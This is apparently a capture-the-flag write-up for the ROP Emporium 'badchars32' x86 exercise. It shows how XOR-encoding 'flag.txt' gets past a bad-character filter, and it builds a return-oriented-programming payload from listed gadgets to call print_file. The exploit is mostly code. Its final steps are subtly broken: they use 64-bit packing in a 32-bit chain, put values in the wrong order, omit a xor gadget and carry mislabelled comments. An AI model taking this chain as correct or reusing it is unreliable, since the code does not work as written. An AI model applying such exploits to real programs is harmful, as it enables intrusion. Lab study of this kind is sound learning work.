# badchars32 x86
Same as problem write4, function print_file will open a file with the fileaname as argument. Therefore, we can make the argument as string "flag.txt". However, "flag.txt" is too long to store in a 32-bit register, we need to write the string into data section and make the argument point to the address of string.

In this problem, there is a bad character list, which reject certain characters in buffer input, here is "a", "g", ".", "x". All these characters can be found in "flag.txt". So we need to find a way to bypass this bad characters checking. A simple way is use xor operation. Xor operation can be canceled by doing corresponded xor operation.

Check the security of binary:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
``` 
Since PIE is disabled, we can find data section address, therefore, we can use the same way in previous problem.

We write string to data section address:
```
readelf
...
.data = 0x804a018 >>> dataSect = 0x804a018 + 0x8
...
```
print_file function plt address:
```
plt 
...
Breakpoint 3 at 0x80483d0 (print_file@plt)
Breakpoint 4 at 0x80483b0 (pwnme@plt)
```
We also need some gadget to do following operations, write to data section, move data section address to rdi register, do the xor operation.
```
ROPgadget --binary badchars32
...
0x0804854f : mov dword ptr [edi], esi ; ret (gadget2) # write string to data section
...
0x080485bb : pop ebp ; ret (gadget4) # pop byte data section address to ebp register
...
0x0804839d : pop ebx ; ret (gadget5) # pop xor operation byte to ebx(bl) register 
...
0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret (gadget1) # pop xor operation byte to ebx(bl) register, string to esi, data section address to edi, byte data section address to ebp.
...
0x08048547 : xor byte ptr [ebp], bl ; ret (gadget3)
...
```
We need to find xor pairs to bypass bad characters checking. Using xor_pair in pwntools:
```
xor_pair(b'flag.txt')
>>> (b'\x01\x01\x01\x01\x01\x01\x01\x01', b'gm`f/uyu')
# '`' ^ 1 = 'a'
# 'f' ^ 1 = 'g'
# '/' ^ 1 = '.'
# 'y' ^ 1 = 'x'
```
We only need to xor bad characters in "flag.txt". Then the string we write to data section will be:
```
b'flag.txt' >>> b'fl`f/tyt'
```
Since x86 can move only 4 bytes a time, we need to separate string "fl`f/tyt" into two part "fl`f", and "/tyt", move them to data section with two mov operations.
Now, we can build our payload:

Firstly, write the xor string 'fl`f' to data section, then do byte xor operation to each byte to string, secondly, write string '/tyt' to data section + (4 bytes), and do byte xor operation to each bbyte to string, finally call print_file.

Same as before, there is a 40 bytes buffer, and 4 bytes ebp.
```
'A'*44
```
Pop string 'fl`f' and data section address to esi edi, and xor byte and data section byte address into bl(ebx) and ebp.
```
p32(gadget1) + p32(0x1) + b'fl`f' + p32(dataSect) + p32(dataSect+2)
```
Write to data section and do xor opeation to 'a' byte.
```
p32(gadget2) + p32(gadget3)
```
Do xor operation to rest string byte 'g'.
```
# 'f' ^ 1 = 'g'
p32(gadget5) + p32(0x1) + p32(gadget4) + p32(dataSect+3) + p32(gadget3)
```
Pop string '/tyt' and data section address to esi edi, and xor byte and data section byte address into bl(ebx) and ebp.
```
p32(gadget1) + p32(0x1) + '/tyt' + p32(dataSect+4) + p32(dataSect+4) 
```
Write to data section and do xor opeation to '.' byte.
```
p32(gadget2) + p32(gadget3)
```
Do xor operation to rest string byte 'g'.
```
# 'y' ^ 1 = 'x'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+6) + p64(gadget4)
```
Jump to print_file.
```
p64(print_file_plt)
```
Execute exploit.py, and obtain the flag.
```
ROPE{a_placeholder_32byte_flag!}
```
